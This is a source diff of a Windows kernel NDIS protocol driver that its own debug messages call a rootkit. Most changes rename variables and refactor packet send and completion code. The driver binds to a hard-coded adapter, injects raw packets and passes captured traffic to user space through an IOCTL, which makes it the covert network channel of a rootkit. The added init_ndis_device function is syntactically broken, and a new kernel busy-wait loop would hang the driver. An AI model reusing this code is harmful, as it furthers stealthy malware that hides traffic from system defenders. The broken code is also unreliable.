@@ -61,8 +61,8 @@
 #define  IRP_ASBUF(  i)        (i->AssociatedIrp.SystemBuffer)
 #define  IRP_IBLEN(  s)        (s->Parameters.DeviceIoControl.InputBufferLength)
 #define  IRP_IOCTL(  s)        (s->Parameters.DeviceIoControl.IoControlCode)
-#define  IRP_DONE(  rp, info) \
-		rp->IoStatus.Status = STATUS_SUCCESS; rp->IoStatus.Information = info; IoCompleteRequest(rp, IO_NO_INCREMENT);
+#define  IRP_DONE(  rp, info, ret) \
+		rp->IoStatus.Status = ret; rp->IoStatus.Information = info; IoCompleteRequest(rp, IO_NO_INCREMENT);
 /* functions */
 	/* basic */
 #define    memzero(            src, len)    memset(                       src,     '\0',len            )
@@ -118,6 +118,7 @@
 #define  RET_ON_ERR(       r      )     if (!(NT_SUCCESS(r))) { DBG_OUT_RET_P(r);                }
 #define  RET_ON_VAL(       r, v   )     if (r != v)           { DBG_OUT_RET_P(r);                }
 #define  RET_ON_VAL_MR(    v, m, r)     if (v)                { DBG_OUT_RET_PM(m, r);            }
+#define  RET_ON_VAL_MRV(   v, m, r)     if (v)                { DBG_OUT_RET_PMV(m, r);           }
 #define  RET_ON_NULL(      ptr    )     if (!ptr)             { printm("ENOMEM"); return NT_ERR; }
 
 
@@ -333,14 +334,15 @@ uchar             *g_packet       = NULL     ;
 size_t             g_packet_size  = 64 * 1024;
 int                g_packet_ready = 0;
 nd_ev              g_closew_event;
+int                g_iface_ready  = 0;
 
 struct user_ctx    g_usrctx;
 struct module_ctx  g_modctx;
 struct packet_ctx  g_pckctx;
 
-spin_lock          GlobalArraySpinLock;
-irq                gIrqL;
-nd_phyaddr         HighestAcceptableMax = NDIS_PHYSICAL_ADDRESS_CONST(-1,-1);
+spin_lock          g_splock;
+irq                g_irq;
+nd_phyaddr         g_phymax = NDIS_PHYSICAL_ADDRESS_CONST(-1,-1);
 
 
 /*** *** *** helper functions *** *** ***/
@@ -389,30 +391,30 @@ void ndis_packet_recv(const uchar *packet, int len)
 }
 
 
-void ndis_packet_send(const uchar *packet, int len)
+void ndis_packet_send_orig(const uchar *packet, int len)
 {
-	NDIS_STATUS aStat;
+	nd_ret ret;
 	
 	DBG_IN;
 	
 	/* aquire lock, release only when send is complete */
-	KeAcquireSpinLock(&GlobalArraySpinLock, &gIrqL);
+	KeAcquireSpinLock(&g_splock, &g_irq);
 	if (g_iface_hndl && packet) {
-		PNDIS_PACKET aPacketP;
-		NdisAllocatePacket(&aStat, &aPacketP, g_packet_pool);
-		if (NDIS_STATUS_SUCCESS == aStat) {
-			PVOID aBufferP;
-			PNDIS_BUFFER anNdisBufferP;
+		nd_pack *npacket;
+		NdisAllocatePacket(&ret, &npacket, g_packet_pool);
+		if (NDIS_STATUS_SUCCESS == ret) {
+			void *pbuf;
+			nd_buf *nbuf;
 			
-			NdisAllocateMemory(&aBufferP, len, 0, HighestAcceptableMax);
-			memcpy(aBufferP, (PVOID) packet, len);
-			NdisAllocateBuffer(&aStat, &anNdisBufferP, g_buffer_pool, aBufferP, len);
-			if (NDIS_STATUS_SUCCESS == aStat) {
-				RESERVED(aPacketP)->Irp = NULL; /* so our OnSendDone() knows this is local */
-				NdisChainBufferAtBack(aPacketP, anNdisBufferP);
-				NdisSend(&aStat, g_iface_hndl, aPacketP);
-				if (aStat != NDIS_STATUS_PENDING ) {
-					ndis_send(g_iface_hndl, aPacketP, aStat);
+			NdisAllocateMemory(&pbuf, len, 0, g_phymax);
+			memcpy(pbuf, (void *) packet, len);
+			NdisAllocateBuffer(&ret, &nbuf, g_buffer_pool, pbuf, len);
+			if (NDIS_STATUS_SUCCESS == ret) {
+				RESERVED(npacket)->Irp = NULL; /* so our OnSendDone() knows this is local */
+				NdisChainBufferAtBack(npacket, nbuf);
+				NdisSend(&ret, g_iface_hndl, npacket);
+				if (ret != NDIS_STATUS_PENDING ) {
+					ndis_send(g_iface_hndl, npacket, ret);
 				}
 			} else {
 				DbgPrint("rootkit: error 0x%X NdisAllocateBuffer\n");
@@ -422,7 +424,47 @@ void ndis_packet_send(const uchar *packet, int len)
 		}
 	}
 	/* release so we can send next.. */
-	KeReleaseSpinLock(&GlobalArraySpinLock, gIrqL);
+	KeReleaseSpinLock(&g_splock, g_irq);
+	DBG_OUT_RV;
+}
+
+
+void ndis_packet_send(const uchar *packet, int len)
+{
+	nd_ret   ret;
+	nd_pack *npacket;
+	void    *pbuf;
+	nd_buf  *nbuf;
+	
+	DBG_IN;
+	
+	if (!g_iface_hndl || !packet) {
+		DBG_OUT_RV;
+	}
+	
+	NdisAllocatePacket(&ret, &npacket, g_packet_pool);
+	RET_ON_VAL_MRV((!(IS_ND_OK(ret))), "NdisAllocatePacket", ret);
+	
+	/* aquire lock, release only when send is complete */
+	KeAcquireSpinLock(&g_splock, &g_irq);
+	
+	NdisAllocateMemory(&pbuf, len, 0, g_phymax);
+	memcpy(pbuf, (void *) packet, len);
+	NdisAllocateBuffer(&ret, &nbuf, g_buffer_pool, pbuf, len);
+	if (!(IS_ND_OK(ret))) {
+		KeReleaseSpinLock(&g_splock, g_irq);
+		DBG_OUT_PMV("NdisAllocateBuffer", ret);
+	}
+	
+	RSRVD_PCKT_CTX(npacket)->rp = NULL; /* so our OnSendDone() knows this is local */
+	NdisChainBufferAtBack(npacket, nbuf);
+	NdisSend(&ret, g_iface_hndl, npacket);
+	if (ret != NDIS_STATUS_PENDING ) {
+		ndis_send(g_iface_hndl, npacket, ret);
+	}
+	
+	/* release so we can send next.. */
+	KeReleaseSpinLock(&g_splock, g_irq);
 	DBG_OUT_RV;
 }
 
@@ -503,37 +545,34 @@ void ndis_reset(nd_hndl protobind_ctx, nd_ret s)
 
 void ndis_send(nd_hndl protobind_ctx, nd_pack *npacket, nd_ret s)
 {
-	PNDIS_BUFFER anNdisBufferP;
-	PVOID aBufferP;
-	UINT aBufferLen;
-	PIRP Irp;
+	nd_buf *nbuf;
+	void   *pbuf;
+	uint    blen;
+	irp    *i;
 	
 	DBG_IN;
 	
-	KeAcquireSpinLock(&GlobalArraySpinLock, &gIrqL);
+	KeAcquireSpinLock(&g_splock, &g_irq);
 	
-	Irp = RESERVED(npacket)->Irp;
-	if (Irp) {
+	i = RSRVD_PCKT_CTX(npacket)->rp;
+	if (i) {
 		NdisReinitializePacket(npacket);
 		NdisFreePacket(npacket);
-		
-		Irp->IoStatus.Status = NDIS_STATUS_SUCCESS;
-		Irp->IoStatus.Information = 0;
-		IoCompleteRequest(Irp, IO_NO_INCREMENT);
+		IRP_DONE(i, 0, ND_OK);
 	} else {
-		NdisUnchainBufferAtFront(npacket, &anNdisBufferP);
-		if (anNdisBufferP) {
-			NdisQueryBuffer(anNdisBufferP, &aBufferP, &aBufferLen);
-			if (aBufferP) {
-				NdisFreeMemory(aBufferP, aBufferLen, 0);
+		NdisUnchainBufferAtFront(npacket, &nbuf);
+		if (nbuf) {
+			NdisQueryBuffer(nbuf, &pbuf, &blen);
+			if (pbuf) {
+				NdisFreeMemory(pbuf, blen, 0);
 			}
-			NdisFreeBuffer(anNdisBufferP);
+			NdisFreeBuffer(nbuf);
 		}
 		NdisReinitializePacket(npacket);
 		NdisFreePacket(npacket);
 	}
 	
-	KeReleaseSpinLock(&GlobalArraySpinLock, gIrqL);
+	KeReleaseSpinLock(&g_splock, g_irq);
 	
 	DBG_OUT_RV;
 }
@@ -729,7 +768,7 @@ nt_ret dev_ioctl(dev_obj *dobj, irp *i)
 			nt_memzero(ubuf, IRP_IBLEN(sl));
 			nt_memcpy(ubuf, g_packet, g_packet_ready);
 			/* finish IRP request */
-			IRP_DONE(i, g_packet_ready);;
+			IRP_DONE(i, g_packet_ready, NT_OK);;
 			printm("IOCTL <<");
 			break;
 		default:
@@ -761,6 +800,14 @@ void init_sending(void)
 	nt_free(pckt);
 	
 	DBG_OUT_RV;
+}
+
+
+nt_ret init_ndis_device(uchar *iface_name, IFACE_LEN)
+{
+	
+	g_iface_name = L"\\Device\\{BDB421B0-4B37-4AA2-912B-3AA05F8A0829}"
+	g_iface_ready = 1;
 }
 
 
@@ -810,6 +857,11 @@ nt_ret init_ndis(mod_obj *mobj)
 	NdisRegisterProtocol(&ret, &g_proto_hndl, &proto, sizeof(nd_proto));
 	RET_ON_ERR_M_ND("NdisRegisterProtocol: error", ret);
 	
+	printm("waiting iface name");
+	while (!g_iface_ready) {
+		continue;
+	}
+	
 	printm("init adapter name");
 	nt_init_ustring(&ifname, L"\\Device\\{BDB421B0-4B37-4AA2-912B-3AA05F8A0829}");
 	//nt_init_ustring(&ifname, L"\\Device\\{2D2E989B-6153-4787-913D-807779793B27}");
@@ -842,7 +894,7 @@ nt_ret init_ndis(mod_obj *mobj)
 	RET_ON_NULL(g_packet);
 	nt_memzero(g_packet, g_packet_size);
 	
-	KeInitializeSpinLock(&GlobalArraySpinLock);
+	KeInitializeSpinLock(&g_splock);
 	
 	DBG_OUT_RET(NT_OK);
 }
